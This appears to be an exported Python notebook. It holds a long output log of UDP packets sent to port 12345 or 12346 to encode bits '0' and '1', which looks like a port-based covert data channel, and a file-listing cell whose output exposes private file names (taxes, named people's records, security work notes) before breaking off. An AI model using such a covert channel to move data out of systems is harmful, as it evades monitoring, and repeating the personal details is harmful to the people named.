# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'

# %%
import os

def list_files(directory):
    file_list = []
    try:
        # Walk through directory
        for dirpath, dirnames, filenames in os.walk(directory):
            # Add path to each filename
            for file in filenames:
                file_list.append(os.path.join(dirpath, file))
        return file_list
    except Exception as e:
        print(f"An error occurred: {e}")
        return []

# Example usage
directory_path = "C:\\1-ironcat"
files = list_files(directory_path)
print("Files in directory and subdirectories:", files)
# Out:
# Files in directory and subdirectories: ['C:\\1-ironcat\\iaiprv1.exe', 'C:\\1-ironcat\\ironcat-1\\072721.md', 'C:\\1-ironcat\\ironcat-1\\2021 Taxes.md', 'C:\\1-ironcat\\ironcat-1\\95at45street.md', 'C:\\1-ironcat\\ironcat-1\\Active Directory Attack Labs.md', 'C:\\1-ironcat\\ironcat-1\\AF Form 715.md', 'C:\\1-ironcat\\ironcat-1\\AFCEA WEST 2024.md', 'C:\\1-ironcat\\ironcat-1\\AFI Notes.md', 'C:\\1-ironcat\\ironcat-1\\AI Roles.md', 'C:\\1-ironcat\\ironcat-1\\AI Summary.md', 'C:\\1-ironcat\\ironcat-1\\Air & Space Core Values.md', 'C:\\1-ironcat\\ironcat-1\\AMB Round Table.md', 'C:\\1-ironcat\\ironcat-1\\Amgen.md', 'C:\\1-ironcat\\ironcat-1\\Apache Commons.md', 'C:\\1-ironcat\\ironcat-1\\APEX Event Abstract.md', 'C:\\1-ironcat\\ironcat-1\\April Hours.md', 'C:\\1-ironcat\\ironcat-1\\ARA-Pentest.md', 'C:\\1-ironcat\\ironcat-1\\Asset Coverage Assessment with MDE.md', 'C:\\1-ironcat\\ironcat-1\\Author Recruitement.md', 'C:\\1-ironcat\\ironcat-1\\Author Recruiting.md', 'C:\\1-ironcat\\ironcat-1\\Author Summit 2023.md', 'C:\\1-ironcat\\ironcat-1\\Author Summit.md', 'C:\\1-ironcat\\ironcat-1\\Ayodele.md', 'C:\\1-ironcat\\ironcat-1\\Aztra Zenica.md', 'C:\\1-ironcat\\ironcat-1\\Bash History.md', 'C:\\1-ironcat\\ironcat-1\\Becoming The Threat Learning Lab.md', 'C:\\1-ironcat\\ironcat-1\\Behavioral Detection Engine.md', 'C:\\1-ironcat\\ironcat-1\\Being A Apex Predator.md', 'C:\\1-ironcat\\ironcat-1\\Black Cat LinkedIn.md', 'C:\\1-ironcat\\ironcat-1\\Blog - Behavioral Bill of Materials.md', 'C:\\1-ironcat\\ironcat-1\\Blog - Building Foundational Training.md', 'C:\\1-ironcat\\ironcat-1\\Blog - Modern Outcome Based Cybersecurity.md', "C:\\1-ironcat\\ironcat-1\\Blog - Schrodinger's Security Proof.md", 'C:\\1-ironcat\\ironcat-1\\Blog - Training With ROI.md', 'C:\\1-ironcat\\ironcat-1\\BMO.md', 'C:\\1-ironcat\\ironcat-1\\Boop.md', 'C:\\1-ironcat\\ironcat-1\\Botnets.md', 'C:\\1-ironcat\\ironcat-1\\Brandon DeVault Record.md', 'C:\\1-ironcat\\ironcat-1\\Build an Email Server on Ubuntu.md', 'C:\\1-ironcat\\ironcat-1\\CCD Exam Notes.md', 'C:\\1-ironcat\\ironcat-1\\Certified Pre-Owned.md', 'C:\\1-ironcat\\ironcat-1\\Chat GPT Enterprise Experience.md', 'C:\\1-ironcat\\ironcat-1\\ChatGPT Enteprise Administration and Deployment.md', 'C:\\1-ironcat\\ironcat-1\\ChatGPT Enterprise.md', 'C:\\1-ironcat\\ironcat-1\\Chevron.md', 'C:\\1-ironcat\\ironcat-1\\Circadence.md', 'C:\\1-ironcat\\ironcat-1\\Cisco Hardening.md', 'C:\\1-ironcat\\ironcat-1\\Claude.md', 'C:\\1-ironcat\\ironcat-1\\Clean Up Traces of Proxy.md', 'C:\\1-ironcat\\ironcat-1\\Cloud and Skills Changes.md', 'C:\\1-ironcat\\ironcat-1\\Conflict Management Refresher.md', 'C:\\1-ironcat\\ironcat-1\\Content Strategy.md', 'C:\\1-ironcat\\ironcat-1\\Cracking Zip File PW.md', 'C:\\1-ironcat\\ironcat-1\\Critical Thinking.md', 'C:\\1-ironcat\\ironcat-1\\CSIRT 21-034 (SQL Inj).md', 'C:\\1-ironcat\\ironcat-1\\CSIRT2022.md', 'C:\\1-ironcat\\ironcat-1\\CTF Notes.md', 'C:\\1-ironcat\\ironcat-1\\CTI - Manulife.md', 'C:\\1-ironcat\\ironcat-1\\Curriculum Strategies.md', 'C:\\1-ironcat\\ironcat-1\\Custom Home.md', 'C:\\1-ironcat\\ironcat-1\\Cyber Security Talks and Workshops.md', 'C:\\1-ironcat\\ironcat-1\\Cyber Shield Admin.md', 'C:\\1-ironcat\\ironcat-1\\Cyber Shield Notes.md', 'C:\\1-ironcat\\ironcat-1\\Cyber Shield Pluralsight Integration.md', 'C:\\1-ironcat\\ironcat-1\\Cyber Side Quests.md', 'C:\\1-ironcat\\ironcat-1\\Cyberbit.md', 'C:\\1-ironcat\\ironcat-1\\Cybershield.md', 'C:\\1-ironcat\\ironcat-1\\Dan Anderegg.md', 'C:\\1-ironcat\\ironcat-1\\Data Scientist Feedback.md', 'C:\\1-ironcat\\ironcat-1\\Defcon Workshop Malware Creation.md', 'C:\\1-ironcat\\ironcat-1\\DEFCON31 Active Directory.md', 'C:\\1-ironcat\\ironcat-1\\Delaware Fed Election.md', 'C:\\1-ironcat\\ironcat-1\\Directory Traversal.md', 'C:\\1-ironcat\\ironcat-1\\docker.md', 'C:\\1-ironcat\\ironcat-1\\DOD.md', 'C:\\1-ironcat\\ironcat-1\\Domain Guidance Steps.md', 'C:\\1-ironcat\\ironcat-1\\Eddie Lockhart - Assessment CP.md', 'C:\\1-ironcat\\ironcat-1\\Edi ...
